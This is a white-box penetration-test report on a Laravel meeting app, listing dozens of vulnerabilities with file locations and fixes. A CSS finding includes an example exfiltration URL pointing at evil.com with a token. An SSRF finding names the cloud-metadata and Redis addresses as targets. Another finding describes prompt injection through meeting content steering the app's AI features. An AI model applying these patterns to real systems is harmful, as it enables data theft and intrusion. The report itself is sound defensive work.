# Penetration Test Report — antaraFlow / antaraNote

**Date:** 2026-04-01
**Assessment Type:** White-Box Source Code Security Audit
**Methodology:** OWASP Top 10 (2021), OWASP ASVS, OWASP Testing Guide
**Scope:** Full source code, configuration, dependencies, deployment pipeline
**Confidentiality:** For internal security improvement only

---

## 1. Executive Summary

### Overall Risk Rating: **HIGH**

The antaraFlow application is a well-structured Laravel 12 application with Domain-Driven Design. The development team has applied many security best practices (Eloquent ORM, Form Requests, policies, organization scoping). However, the audit identified **5 Critical**, **14 High**, and **10+ Medium** severity issues that require immediate attention.

### Top 5 Most Critical Findings

| # | Finding | Severity | Impact |
|---|---------|----------|--------|
| 1 | **Hard-coded OpenAI API key in committed `.env.example`** | CRITICAL | Financial loss, API abuse |
| 2 | **Stored XSS via unescaped `{!! $meeting->content !!}` in guest view** | CRITICAL | Account takeover of guest viewers, data exfiltration |
| 3 | **No rate limiting on login, registration, or API authentication** | CRITICAL | Credential stuffing, brute force, account enumeration |
| 4 | **Social auth account takeover via email-based auto-linking** | HIGH | Full account compromise without password |
| 5 | **Custom CSS injection enabling XSS via admin branding** | HIGH | Persistent XSS affecting all authenticated users |

### Business Impact

- **Data Breach Risk**: Guest access exposes organization details and attendee PII to unauthenticated visitors
- **Financial Risk**: Leaked API key enables unauthorized OpenAI usage; subscription limits can be bypassed via race conditions
- **Compliance Risk**: Session encryption disabled, weak password policies, missing security headers
- **Reputational Risk**: Stored XSS in public-facing guest views; AI prompt injection can produce misleading outputs

---

## 2. Project Overview

| Attribute | Detail |
|-----------|--------|
| **Framework** | Laravel 12 (PHP 8.4) |
| **Frontend** | Blade templates, Alpine.js, Tailwind CSS, Vite |
| **Database** | MySQL/PostgreSQL (configurable) |
| **Architecture** | Monolith with Domain-Driven Design (13 domains) |
| **Authentication** | Session-based (Laravel default), Social OAuth (Socialite), API keys |
| **Real-time** | Laravel Reverb (WebSockets) |
| **AI Integration** | OpenAI, Anthropic, Google AI, Ollama |
| **File Storage** | Local/S3 (configurable) |
| **Key Features** | Multi-tenant (organization-scoped), meeting management, AI extraction, live transcription, action items, reports, webhooks, guest access, admin panel, QR registration |
| **Admin Panel** | Separate admin auth guard with dedicated middleware |

---

## 3. Configuration & Deployment Security

### 3.1 CRITICAL: Hard-coded API Key in Repository
- **File**: `.env.example:93`
- **Issue**: Contains a real OpenAI API key (`sk-proj-BGP151i4X9...`). This file is committed to git.
- **Impact**: Anyone with repo access can use the key for unauthorized API calls.
- **Remediation**: Revoke the key immediately. Replace with empty placeholder. Audit OpenAI usage logs.

### 3.2 HIGH: Debug Mode Enabled by Default
- **File**: `.env.example:4`
- **Issue**: `APP_DEBUG=true` is the default. The `composer setup` script copies `.env.example` to `.env`, propagating debug mode to fresh deployments.
- **Impact**: Full stack traces, environment variables, and query details exposed to attackers.
- **Remediation**: Set `APP_DEBUG=false` in `.env.example`. Add deployment gates that reject debug mode in non-local environments.

### 3.3 HIGH: No CORS Configuration
- **File**: `config/cors.php` — **does not exist**
- **Issue**: Application has API routes but no explicit CORS policy.
- **Impact**: Either overly permissive defaults or broken cross-origin requests.
- **Remediation**: Create `config/cors.php` with explicit origin allowlist.

### 3.4 HIGH: Predictable WebSocket Credentials
- **File**: `.env.example:67-69`
- **Issue**: Reverb credentials use trivially guessable values (`antaraflow-key`, `antaraflow-secret`), exposed to frontend via `VITE_REVERB_APP_KEY`.
- **Impact**: Attackers can subscribe to or publish on private broadcast channels.
- **Remediation**: Generate cryptographically random credentials.

### 3.5 HIGH: Wildcard Dependency Versions
- **File**: `composer.json:13-18`
- **Issue**: Four production dependencies use `"*"`: `barryvdh/laravel-dompdf`, `laravel/reverb`, `laravel/socialite`, `phpoffice/phpword`.
- **Impact**: Supply chain risk; `composer update` can pull compromised versions.
- **Remediation**: Pin to specific major/minor version ranges.

### 3.6 MEDIUM: No Security Headers
- **Issue**: No middleware adding `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, or `Permissions-Policy` headers.
- **Remediation**: Add security headers middleware to all web routes.

---

## 4. Authentication & Session Management

### 4.1 CRITICAL: No Rate Limiting on Login
- **File**: `app/Domain/Account/Controllers/Auth/LoginController.php:20-33`
- **File**: `app/Domain/Account/Requests/LoginRequest.php`
- **Issue**: No `RateLimiter` usage, no `ThrottleRequests` middleware on login route.
- **Impact**: Unlimited credential stuffing and brute-force attacks.
- **Remediation**: Use `RateLimiter::tooManyAttempts()` keyed on email+IP in `LoginRequest`. Apply `throttle:5,1` middleware.

### 4.2 HIGH: No Rate Limiting on Registration
- **File**: `app/Domain/Account/Controllers/Auth/RegisterController.php:27-43`
- **Issue**: No throttle middleware on registration.
- **Impact**: Mass account creation, spam organizations.
- **Remediation**: Apply `throttle:3,1` middleware.

### 4.3 HIGH: Weak Password Policy on Registration
- **File**: `app/Domain/Account/Requests/RegisterRequest.php:22`
- **Issue**: Only enforces `min:8`. No uppercase, lowercase, digit, or special character requirements. Contrast with `UpdatePasswordRequest` which correctly uses `Password::defaults()`.
- **Impact**: Users can set trivially weak passwords (e.g., `aaaaaaaa`).
- **Remediation**: Use `Password::defaults()` or `Password::min(8)->mixedCase()->numbers()->uncompromised()`.

### 4.4 HIGH: Session Encryption Disabled
- **File**: `config/session.php:50`
- **Issue**: `'encrypt' => env('SESSION_ENCRYPT', false)`. Database-stored sessions are plaintext.
- **Impact**: Database compromise exposes all session data.
- **Remediation**: Default to `true`.

### 4.5 HIGH: Secure Cookie Flag Not Enforced
- **File**: `config/session.php:172`
- **Issue**: `'secure' => env('SESSION_SECURE_COOKIE')` defaults to `null`.
- **Impact**: Session cookies transmitted over plain HTTP.
- **Remediation**: Default to `true` or `app()->environment('production')`.

### 4.6 MEDIUM: Password Confirmation Timeout Too Long
- **File**: `config/auth.php:123`
- **Issue**: `password_timeout` is 10800 seconds (3 hours).
- **Impact**: Hijacked sessions can perform sensitive actions for 3 hours.
- **Remediation**: Reduce to 900 seconds (15 minutes).

### 4.7 HIGH: Social Auth Account Takeover
- **File**: `app/Domain/Account/Services/SocialAuthService.php:30-38`
- **Issue**: When social login returns an email matching an existing user, the account is automatically linked and logged in with no consent verification, no password confirmation, and no notification.
- **Impact**: Attacker with a social account using victim's email gets full access.
- **Remediation**: Require existing credentials before linking. Only auto-link if social provider has verified the email.

### 4.8 MEDIUM: API Key Timing Attack + No Rate Limiting
- **File**: `app/Domain/API/Middleware/ApiKeyAuthentication.php:23`
- **Issue**: API key lookup via database `WHERE` clause (non-constant-time). No rate limiting on API auth.
- **Remediation**: Apply rate limiting to API routes. Log failed attempts.

---

## 5. Authorization & Access Control

### 5.1 HIGH: No Policy Enforcement on API Controllers
- **Files**: `app/Domain/API/Controllers/V1/MeetingApiController.php`, `ActionItemApiController.php`, `WebhookApiController.php`, `TranscriptionApiController.php`
- **Issue**: API controllers rely solely on organization_id filtering from the API key but do not invoke Laravel policies (`$this->authorize()`). The web controllers correctly use policies; the API controllers do not.
- **Impact**: Any API key holder in an organization can perform actions on any resource within that organization, regardless of their actual permissions.
- **Remediation**: Add `$this->authorize()` calls in all API controller methods.

### 5.2 HIGH: Guest Access Exposes Organization Data and Attendee PII
- **File**: `app/Domain/Meeting/Controllers/GuestAccessController.php:55-81`
- **Issue**: Uses `withoutGlobalScopes()` and eager-loads `organization` (exposing internal org details) and unfiltered `attendees` (exposing names, emails, phones) to unauthenticated visitors.
- **Impact**: Anyone with a guest token sees full organization and attendee personal information.
- **Remediation**: Remove `organization` from eager loads. Filter attendees to names only.

### 5.3 HIGH: Webhook Secret Exposed in API Responses
- **File**: `app/Domain/API/Controllers/V1/WebhookApiController.php:29-39`
- **Issue**: Returns full `WebhookEndpoint` model as JSON including decrypted `secret` field. No `$hidden` property on the model.
- **Impact**: API key holders can retrieve all webhook HMAC signing secrets.
- **Remediation**: Add `protected $hidden = ['secret']` to `WebhookEndpoint` model.

### 5.4 HIGH: Policies Don't Verify Organization Ownership (IDOR)
- **File**: `app/Domain/Meeting/Policies/MinutesOfMeetingPolicy.php:28-35`
- **File**: `app/Domain/ActionItem/Policies/ActionItemPolicy.php:26-50`
- **Issue**: Policy methods check user permissions but never verify `$meeting->organization_id === $user->current_organization_id`. If the `OrganizationScope` is bypassed (via `withoutGlobalScopes()`, route model binding without scoping, or API access), a user in Org A could access meetings in Org B and the policy would approve it.
- **Remediation**: Add `$model->organization_id === $user->current_organization_id` as the first check in every policy method.

### 5.5 HIGH: Guest Access Link Creation Has No Input Validation
- **File**: `app/Domain/Meeting/Controllers/GuestAccessController.php:18-36`
- **Issue**: `store()` uses `$request->input()` directly for `label`, `email`, `expires_at` with no validation — no FormRequest, no inline validation. Label could contain XSS payloads, email has no format validation, expires_at has no date validation.
- **Remediation**: Create `CreateGuestAccessRequest` with proper validation rules.

### 5.6 MEDIUM: OrganizationScope Fails Silently When Unauthenticated
- **File**: `app/Infrastructure/Tenancy/OrganizationScope.php:13-21`
- **Issue**: When `auth()->check()` returns false or `current_organization_id` is null, the scope adds NO constraint — queries return ALL records across ALL organizations. Queue workers, scheduled commands, and API routes using key auth are affected.
- **Remediation**: Throw an exception or add `WHERE 1=0` when organization context is missing.

### 5.7 MEDIUM: ShareController Allows Cross-Org User Sharing
- **File**: `app/Domain/Collaboration/Controllers/ShareController.php:37-49`
- **Issue**: `shared_with_user_id` from validated input is not verified to belong to the same organization, allowing shares targeting users in other organizations.
- **Remediation**: Validate `shared_with_user_id` belongs to the same organization.

### 5.8 MEDIUM: API Allows Deleting Approved/Finalized Meetings
- **File**: `app/Domain/API/Controllers/V1/MeetingApiController.php:71-81`
- **Issue**: `destroy()` has no status check, unlike `MeetingService::update()` which blocks edits to Approved meetings. API bypasses governance workflow enforced by web UI.
- **Remediation**: Add status check to prevent deletion of Approved/Finalized meetings.

### 5.9 MEDIUM: Mass Assignment Risk (`$guarded = ['id']` on ALL models)
- **Files**: All 59 models use `protected $guarded = ['id']`
- **Issue**: Every column except `id` is mass-assignable. While controllers currently use `$request->validated()`, any future code path passing unvalidated data enables overwriting security-critical columns (`organization_id`, `status`, `is_active`, `role`).
- **Impact**: Systemic risk amplified by code evolution.
- **Remediation**: Switch to explicit `$fillable` arrays. At minimum, ensure `organization_id`, `created_by`, `status`, `secret` are never mass-assignable.

---

## 6. Input Validation & Injection Vulnerabilities

### 6.1 CRITICAL: Stored XSS in Guest Meeting View
- **File**: `resources/views/meetings/guest.blade.php:113`
- **Code**: `{!! $meeting->content !!}`
- **Issue**: Meeting content is rendered as raw, unescaped HTML in the public guest view. If meeting content contains `<script>` tags or event handlers, they execute in the guest's browser.
- **Impact**: Any user who can edit meeting content can inject JavaScript that runs for all guest viewers (account compromise, data theft, phishing).
- **Remediation**: Use `{!! nl2br(e($meeting->content)) !!}` (escape then convert newlines), or implement a HTML purifier (e.g., `HTMLPurifier`) for rich text content.

### 6.2 HIGH: Custom CSS Injection / XSS via Admin Branding
- **File**: `resources/views/layouts/app.blade.php:71`
- **Code**: `<style>{!! $branding->get('custom_css') !!}</style>`
- **Also in**: `resources/views/layouts/guest.blade.php:32`
- **Issue**: Admin-configurable custom CSS is injected without sanitization. CSS injection can be used for data exfiltration (e.g., `background: url(https://evil.com/?token=...)`) and in some browsers, JavaScript execution via `expression()` or `@import`.
- **Impact**: A compromised or malicious admin can inject persistent XSS affecting every authenticated user.
- **Remediation**: Sanitize CSS input (strip `url()`, `@import`, `expression`, `javascript:` patterns). Or use a CSP that prevents inline styles and use class-based theming instead.

### 6.3 HIGH: Unrestricted File Upload (No MIME Type Validation on Documents)
- **File**: `app/Domain/Meeting/Requests/UploadDocumentRequest.php:19-21`
- **Issue**: Only validates file presence and 50MB size. No `mimes` or `mimetypes` rule. Any file type can be uploaded: PHP scripts, HTML with XSS, `.htaccess`, executables.
- **Contrast**: Audio upload (`UploadAudioRequest.php:20`) correctly restricts to specific MIME types.
- **Remediation**: Add `mimes:pdf,doc,docx,txt,rtf,odt,pptx,xlsx` rule.

### 6.4 HIGH: Client-Controlled MIME Type Trusted
- **File**: `app/Domain/Meeting/Controllers/DocumentController.php:30`
- **Issue**: Uses `$file->getClientMimeType()` (browser-provided, spoofable) instead of `$file->getMimeType()` (server-side `finfo` detection).
- **Remediation**: Use `$file->getMimeType()` for server-side verification.

### 6.5 HIGH: Prompt Injection in AI Features
- **Files**: `app/Domain/AI/Services/ChatService.php:29,40-43,106-117`, `app/Domain/Search/Services/AiSearchService.php:148`, `app/Domain/AI/Services/ExtractionService.php:182-185`
- **Issue**: User messages, meeting content (titles, summaries, transcripts), and custom extraction templates are passed directly to AI providers without sanitization or prompt boundary enforcement. Malicious content in meeting titles or transcripts can inject instructions into system prompts.
- **Impact**: AI output manipulation, data exfiltration via AI responses, misleading extraction results.
- **Remediation**: Implement prompt boundary markers (XML delimiters). Sanitize interpolated content. Validate extraction template content. Filter AI output before returning to users.

### 6.6 MEDIUM: LIKE Wildcard Injection in Search
- **File**: `app/Domain/Search/Services/GlobalSearchService.php:30-32,54-55,79-80`
- **Issue**: User input interpolated into LIKE patterns without escaping `%` and `_` metacharacters.
- **Impact**: Full table scans (DoS), information disclosure via wildcard abuse.
- **Remediation**: Escape LIKE metacharacters: `str_replace(['%', '_'], ['\\%', '\\_'], $query)`.

### 6.7 MEDIUM: Error Message Information Leakage
- **File**: `app/Domain/AI/Controllers/ExtractionController.php:52`
- **Issue**: Full exception message returned to client: `'Extraction failed: '.$e->getMessage()`.
- **Remediation**: Return generic error message; log full exception server-side.

---

## 7. API Security

### 7.1 HIGH: No Rate Limiting on API Endpoints
- **Issue**: API routes have no `throttle` middleware. Combined with the lack of per-key rate limiting in `ApiKeyAuthentication.php`, an attacker with a valid or stolen API key can make unlimited requests.
- **Remediation**: Apply `throttle:60,1` (or appropriate limits) to all API route groups.

### 7.2 HIGH: API Key Has No Scope/Permission Restrictions
- **File**: `app/Domain/API/Middleware/ApiKeyAuthentication.php:14-43`
- **Issue**: Middleware only checks `is_active` and `expires_at`. No IP allowlist, no scope/permission validation, no per-key rate enforcement.
- **Impact**: A leaked API key grants full access to the organization's API surface.
- **Remediation**: Add optional IP allowlisting, scope-based permissions, and per-key rate limiting.

### 7.3 MEDIUM: AI Search Response Cache Poisoning
- **File**: `app/Domain/Search/Services/AiSearchService.php:31-35`
- **Issue**: AI search results cached using `md5($query)` with 1-hour TTL. If prompt injection causes AI to return poisoned results, they are cached and served to all subsequent users making the same query.
- **Remediation**: Include user ID or organization ID in cache key. Add cache invalidation mechanism.

---

## 8. Business Logic & Client-Side Issues

### 8.1 CRITICAL: Race Condition in QR Registration
- **File**: `app/Domain/Attendee/Controllers/QrRegistrationController.php:90-144`
- **File**: `app/Domain/Attendee/Models/QrRegistrationToken.php:38-45`
- **Issue**: `isFull()` check and `incrementRegistrations()` are not atomic. Concurrent requests can all pass the check before any increment, allowing over-registration beyond `max_attendees`.
- **Remediation**: Use `lockForUpdate()` in a transaction, or atomic conditional update: `UPDATE ... SET registrations_count = registrations_count + 1 WHERE registrations_count < max_attendees`.

### 8.2 HIGH: Race Condition in Live Meeting Session Start
- **File**: `app/Domain/LiveMeeting/Services/LiveMeetingService.php:28-46`
- **Issue**: Existence check and session creation not atomic. Concurrent requests create duplicate active sessions.
- **Remediation**: Add unique constraint on `(minutes_of_meeting_id, status)` or use `lockForUpdate()`.

### 8.3 HIGH: Subscription Limit Bypass via Race Condition
- **File**: `app/Domain/Account/Services/SubscriptionService.php:85-97`
- **Issue**: `checkLimit()` and `incrementUsage()` are not atomic. Concurrent requests can all pass limits.
- **Remediation**: Combine check and increment into atomic database operation.

### 8.4 HIGH: Service Worker Background Sync Missing CSRF Token
- **File**: `public/sw.js:135-141`
- **Issue**: POST to `/offline/sync` has no CSRF token. Either the request fails (broken feature) or CSRF is disabled for the route (vulnerable to forgery).
- **Impact**: Cross-site attacker could inject fake notes/comments into user meetings.
- **Remediation**: Use Sanctum token-based auth or cookie-based CSRF that works with service workers.

### 8.5 MEDIUM: Sensitive Meeting Data in IndexedDB Without Encryption
- **File**: `resources/js/offline-store.js:54-63`
- **Issue**: `cacheMeeting()` stores full meeting JSON in IndexedDB in plaintext. This data persists on disk and is accessible to any script on the same origin, browser extensions, and physical device access.
- **Remediation**: Encrypt sensitive fields using Web Crypto API. Implement TTL-based automatic purge.

### 8.6 MEDIUM: Global Offline Store Exposed on Window Object
- **File**: `resources/js/offline-store.js:208-224`
- **Issue**: `window.__offlineStore.cacheMeetingFromUrl(url)` is exposed globally. It fetches any URL with user cookies and caches the response. An XSS anywhere on the origin can invoke this to exfiltrate data. URL parameter is not validated.
- **Remediation**: Remove global bridge or restrict URL to allowlist pattern.

### 8.7 MEDIUM: Social Auth Creates User with Null Password
- **File**: `app/Domain/Account/Services/SocialAuthService.php:41-58`
- **Issue**: New social auth users get `email_verified_at = now()` (trusting provider without verification) and then have password set to `null`. If social provider is unlinked, user is in inconsistent state with no password and "verified" email.
- **Remediation**: Don't auto-verify email unless social provider confirms it. Keep random password instead of nullifying.

### 8.8 MEDIUM: Audio Upload Validates Extension Not Content
- **File**: `app/Domain/LiveMeeting/Controllers/LiveMeetingController.php:72-77`
- **Issue**: Uses `getClientOriginalExtension()` (reads filename extension from client headers, spoofable). Attacker could upload PHP webshell with `.webm` extension.
- **Remediation**: Use `$file->getMimeType()` for server-side content detection.

### 8.9 MEDIUM: Weak QR Join Code Entropy
- **File**: `app/Domain/Attendee/Controllers/QrRegistrationController.php:35`
- **Issue**: 6-character alphanumeric join code (~2.18 billion possibilities). Feasible to brute-force without rate limiting.
- **Remediation**: Increase to 8-10 characters. Add rate limiting on join code lookup.

### 8.6 MEDIUM: Guest Access Token Not Rate-Limited
- **File**: `app/Domain/Meeting/Controllers/GuestAccessController.php:55`
- **Issue**: No throttle middleware on public guest token endpoint.
- **Remediation**: Apply `throttle:10,1` to guest access routes.

---

## 9. Cryptography & Sensitive Data

### 9.1 Positive Findings
- Password hashing uses Laravel's default bcrypt (appropriate)
- API keys are hashed with SHA-256 before storage
- Webhook secrets use Laravel's `encrypted` cast
- Guest tokens use `Str::random(48)` (cryptographically secure, 288 bits of entropy)

### 9.2 MEDIUM: SSRF via Configurable AI Provider Base URL
- **Files**: `app/Domain/AI/Services/ChatService.php:133`, `app/Domain/AI/Services/ExtractionService.php:130`
- **Issue**: Organization admins can configure a custom `base_url` for AI providers via `AiProviderConfig`. This URL is passed to `AIProviderFactory::make()` which makes HTTP requests to it. An attacker could point it at internal network addresses (e.g., `http://169.254.169.254/` for cloud metadata, `http://localhost:6379/` for Redis).
- **Remediation**: Validate `base_url` against an allowlist of permitted domains. Block private/internal IP ranges and cloud metadata endpoints.

### 9.3 MEDIUM: AI-Generated Content Stored Without Sanitization
- **Files**: `app/Domain/AI/Services/ExtractionService.php:69-80,371-377`
- **Issue**: AI-generated content (action item titles, descriptions, topic content) is stored in the database without sanitization. If the AI is tricked via prompt injection to return HTML/script tags, and templates use `{!! !!}` for rendering, this creates a stored XSS chain.
- **Remediation**: Sanitize all AI-generated content before storage using `strip_tags()` or HTML Purifier.

### 9.4 MEDIUM: Double Password Hashing Bug
- **Files**: `app/Domain/Account/Controllers/Auth/RegisterController.php:32`, `app/Models/User.php:39`
- **Issue**: `RegisterController` calls `Hash::make()` explicitly, but the User model has `'password' => 'hashed'` cast which auto-hashes on set. This double-hashes passwords, making login impossible after registration. Same issue in `SecuritySettingsController::updatePassword()`.
- **Impact**: Functional bug that forces users into password reset flows, potentially masking brute-force vulnerabilities.
- **Remediation**: Remove explicit `Hash::make()` and pass raw password, letting the cast handle hashing.

### 9.5 MEDIUM: Login Ignores Email Verification Status
- **File**: `app/Domain/Account/Controllers/Auth/LoginController.php:22-28`
- **Issue**: `Auth::attempt()` succeeds regardless of email verification. User model doesn't implement `MustVerifyEmail`.
- **Remediation**: Implement `MustVerifyEmail` contract on User model and add `verified` middleware.

### 9.6 MEDIUM: Remember Token Not Invalidated on Password Change
- **File**: `app/Domain/Account/Controllers/SecuritySettingsController.php:21-26`
- **Issue**: Password change doesn't regenerate `remember_token`. "Remember me" sessions on other devices survive password changes.
- **Remediation**: Regenerate remember token and call `Auth::logoutOtherDevices()` after password change.

### 9.7 MEDIUM: Sensitive Data in CalendarConnection Model
- **File**: `app/Domain/Calendar/Models/CalendarConnection.php`
- **Issue**: OAuth tokens (`access_token`, `refresh_token`) are stored and their encryption/decryption handling should be verified.
- **Remediation**: Ensure OAuth tokens use Laravel's `encrypted` cast.

### 9.3 MEDIUM: AI Provider API Keys in Database
- **File**: `app/Domain/Account/Models/AiProviderConfig.php`
- **Issue**: AI provider API keys are stored in the database. Ensure they use `encrypted` cast.
- **Remediation**: Verify `encrypted` cast is applied to API key fields.

---

## 10. Dependency & Supply Chain Security

### 10.1 HIGH: Wildcard Version Constraints
- **File**: `composer.json`
- **Packages**: `barryvdh/laravel-dompdf: "*"`, `laravel/reverb: "*"`, `laravel/socialite: "*"`, `phpoffice/phpword: "*"`
- **Remediation**: Pin to specific version ranges. Run `composer audit` regularly.

### 10.2 MEDIUM: Known Risks in DomPDF
- `barryvdh/laravel-dompdf` has had historical SSRF and remote code execution vulnerabilities.
- **Remediation**: Pin to latest patched version. Run `composer audit`. Sanitize HTML input to DomPDF.

### 10.3 Recommendation: Automated Dependency Scanning
- Add `composer audit` and `npm audit` to CI/CD pipeline.
- Consider Dependabot or Snyk for automated vulnerability alerts.

---

## 11. Findings Summary Table

| # | Vulnerability | Severity | Location | OWASP |
|---|-------------|----------|----------|-------|
| 1 | Hard-coded OpenAI API key in `.env.example` | **CRITICAL** | `.env.example:93` | A02 |
| 2 | Stored XSS in guest meeting view | **CRITICAL** | `meetings/guest.blade.php:113` | A03 |
| 3 | No rate limiting on login | **CRITICAL** | `LoginController.php:20-33` | A07 |
| 4 | Race condition in QR registration | **CRITICAL** | `QrRegistrationController.php:90-144` | A04 |
| 5 | Unrestricted file upload (documents) | **CRITICAL** | `UploadDocumentRequest.php:19-21` | A04 |
| 6 | Social auth account takeover | **HIGH** | `SocialAuthService.php:30-38` | A07 |
| 7 | Custom CSS injection / XSS | **HIGH** | `layouts/app.blade.php:71` | A03 |
| 8 | No rate limiting on registration | **HIGH** | `RegisterController.php:27-43` | A07 |
| 9 | Weak password policy (registration) | **HIGH** | `RegisterRequest.php:22` | A07 |
| 10 | Session encryption disabled | **HIGH** | `config/session.php:50` | A02 |
| 11 | Secure cookie flag not enforced | **HIGH** | `config/session.php:172` | A02 |
| 12 | Guest access exposes PII | **HIGH** | `GuestAccessController.php:55-81` | A01 |
| 13 | Webhook secret in API response | **HIGH** | `WebhookApiController.php:29-39` | A02 |
| 14 | No policy enforcement on API controllers | **HIGH** | `API/Controllers/V1/*` | A01 |
| 15 | Prompt injection in AI features | **HIGH** | `ChatService.php`, `AiSearchService.php` | A03 |
| 16 | Service worker CSRF bypass | **HIGH** | `public/sw.js:135-141` | A01 |
| 17 | Subscription limit race condition | **HIGH** | `SubscriptionService.php:85-97` | A04 |
| 18 | Live meeting session race condition | **HIGH** | `LiveMeetingService.php:28-46` | A04 |
| 19 | Client MIME type trusted | **HIGH** | `DocumentController.php:30` | A04 |
| 20 | No CORS configuration | **HIGH** | `config/cors.php` (missing) | A05 |
| 21 | Wildcard dependency versions | **HIGH** | `composer.json:13-18` | A06 |
| 22 | Predictable WebSocket credentials | **HIGH** | `.env.example:67-69` | A07 |
| 23 | Debug mode default enabled | **HIGH** | `.env.example:4` | A05 |
| 24 | No API rate limiting | **HIGH** | API routes | A04 |
| 25 | Mass assignment risk (`$guarded=['id']`) | **MEDIUM** | All 59 models | A01 |
| 26 | LIKE wildcard injection | **MEDIUM** | `GlobalSearchService.php:30-32` | A03 |
| 27 | Password confirmation timeout 3hr | **MEDIUM** | `config/auth.php:123` | A07 |
| 28 | Error message information leakage | **MEDIUM** | `ExtractionController.php:52` | A05 |
| 29 | Weak QR join code entropy | **MEDIUM** | `QrRegistrationController.php:35` | A07 |
| 30 | AI cache poisoning | **MEDIUM** | `AiSearchService.php:31-35` | A08 |
| 31 | No security headers | **MEDIUM** | Global middleware | A05 |
| 32 | Guest token not rate-limited | **MEDIUM** | `GuestAccessController.php:55` | A07 |
| 33 | SSRF via configurable AI base URL | **MEDIUM** | `ChatService.php:133` | A10 |
| 34 | AI content stored unsanitized | **MEDIUM** | `ExtractionService.php:69-80` | A03 |
| 35 | Double password hashing (functional bug) | **MEDIUM** | `RegisterController.php:32`, `User.php:39` | A07 |
| 36 | Login ignores email verification | **MEDIUM** | `LoginController.php:22-28` | A07 |
| 37 | Remember token survives password change | **MEDIUM** | `SecuritySettingsController.php:21-26` | A07 |
| 38 | Policies don't verify org ownership (IDOR) | **HIGH** | `MinutesOfMeetingPolicy.php`, `ActionItemPolicy.php` | A01 |
| 39 | Guest link creation has no validation | **HIGH** | `GuestAccessController.php:18-36` | A03 |
| 40 | OrganizationScope silent fail when unauthed | **MEDIUM** | `OrganizationScope.php:13-21` | A01 |
| 41 | Cross-org user sharing allowed | **MEDIUM** | `ShareController.php:37-49` | A01 |
| 42 | API bypasses meeting governance workflow | **MEDIUM** | `MeetingApiController.php:71-81` | A04 |
| 43 | IndexedDB stores meetings unencrypted | **MEDIUM** | `offline-store.js:54-63` | A02 |
| 44 | Global `__offlineStore` bridge exploitable via XSS | **MEDIUM** | `offline-store.js:208-224` | A03 |
| 45 | Social auth creates user with null password | **MEDIUM** | `SocialAuthService.php:41-58` | A07 |
| 46 | Audio upload validates extension not content | **MEDIUM** | `LiveMeetingController.php:72-77` | A04 |

---

## 12. Prioritized Remediation Roadmap

### Immediate (This Week) — Critical + Quick Wins

1. **Revoke and rotate the hard-coded OpenAI API key** (Finding 1)
2. **Fix stored XSS**: Change `{!! $meeting->content !!}` to escaped output or purified HTML (Finding 2)
3. **Add rate limiting** to login, registration, API auth, and guest access routes (Findings 3, 8, 24, 32)
4. **Add MIME type validation** to document upload (Finding 5)
5. **Use `$file->getMimeType()`** instead of `getClientMimeType()` (Finding 19)
6. **Add `$hidden = ['secret']`** to WebhookEndpoint model (Finding 13)
7. **Set `APP_DEBUG=false`** in `.env.example` (Finding 23)
8. **Replace predictable Reverb credentials** with random values (Finding 22)
9. **Fix `Password::defaults()` inconsistency** in RegisterRequest (Finding 9)

### Next Sprint (1-2 Weeks)

10. **Fix social auth account takeover** — require password confirmation before linking (Finding 6)
11. **Sanitize custom CSS** input to prevent XSS (Finding 7)
12. **Enable session encryption** (`SESSION_ENCRYPT=true`) (Finding 10)
13. **Set secure cookie flag** (`SESSION_SECURE_COOKIE=true`) (Finding 11)
14. **Fix race conditions** in QR registration, live sessions, subscription limits (Findings 4, 17, 18)
15. **Add policy enforcement** to API controllers (Finding 14)
16. **Filter guest access PII** — remove org details, limit attendee fields (Finding 12)
17. **Create CORS configuration** (Finding 20)
18. **Fix service worker CSRF** (Finding 16)
19. **Pin wildcard dependencies** (Finding 21)

### Ongoing Improvements

20. **Implement prompt injection defenses** for AI features (Finding 15)
21. **Switch models to `$fillable`** instead of `$guarded` (Finding 25)
22. **Add security headers middleware** (CSP, HSTS, X-Frame-Options) (Finding 31)
23. **Reduce password confirmation timeout** to 15 minutes (Finding 27)
24. **Escape LIKE metacharacters** in search (Finding 26)
25. **Add `composer audit` and `npm audit`** to CI/CD (Finding 21)
26. **Implement API key scopes and IP allowlisting** (Finding 24)
27. **Add error handling** that returns generic messages (Finding 28)
28. **Increase QR join code length** (Finding 29)

---

## 13. Conclusion & Security Recommendations

### Strengths Observed
- Domain-Driven Design with clear separation of concerns
- Consistent use of Form Request validation in web controllers
- Laravel policies implemented for most web routes
- Organization scoping via global scopes for tenant isolation
- No raw SQL queries (`DB::raw`) found in application code
- No command injection vectors (`exec`, `shell_exec`, etc.)
- Use of `$request->validated()` in most controllers
- Proper use of Eloquent ORM throughout

### Systemic Recommendations

1. **Security-first `.env.example`**: Defaults should be secure (debug=false, encrypt=true, secure cookies=true)
2. **Rate limiting as default**: Apply global rate limiting middleware to all route groups
3. **Content Security Policy**: Implement strict CSP headers to mitigate XSS
4. **Automated security scanning**: Add SAST tools (PHPStan with security rules, Psalm), dependency auditing, and secret scanning to CI/CD
5. **AI security layer**: Implement prompt boundary markers, input sanitization, and output filtering for all AI features
6. **Security regression tests**: Write Pest tests for each finding to prevent regression
7. **Regular penetration testing**: Schedule quarterly security reviews as the application grows

---

*This report is provided for security improvement and educational purposes. All findings should be verified in a staging environment before applying fixes to production.*
